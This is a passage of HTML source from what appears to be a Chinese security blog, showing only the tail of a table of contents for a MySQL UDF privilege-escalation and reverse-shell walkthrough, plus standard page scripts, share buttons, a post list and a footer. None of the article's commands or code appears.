href="#%E8%8E%B7%E5%8F%96mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">获取mysql数据库密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bmysql%E6%98%AF%E5%90%A6%E5%85%B7%E5%A4%87%E5%86%99%E6%9D%83%E9%99%90"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">查看mysql是否具备写权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96mysql%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">获取mysql安装路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bmysql%E7%BC%96%E8%AF%91%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">查看mysql编译版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96udf%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">获取udf的动态链接库并上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5udf%E6%96%87%E4%BB%B6%E5%B9%B6%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.3.6.</span> <span class="toc-text">导入udf文件并创建自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.3.7.</span> <span class="toc-text">利用自定义函数反弹shell</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/08/28/vulnhub%E9%9D%B6%E6%9C%BALampiao/" title="下一篇: Lampiao">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/08/30/Raven/">Raven</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/vulnhub%E9%9D%B6%E6%9C%BALampiao/">Lampiao</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/">GOLDENEYE-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/12/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-%E9%A1%B9%E7%9B%AE%E5%85%AD/">暗月渗透实战靶场-项目六</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/02/msf/">Metasploit Framework</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">瑞士军刀nc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">vulnhub靶机Os-hackNos-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/16/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":300,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
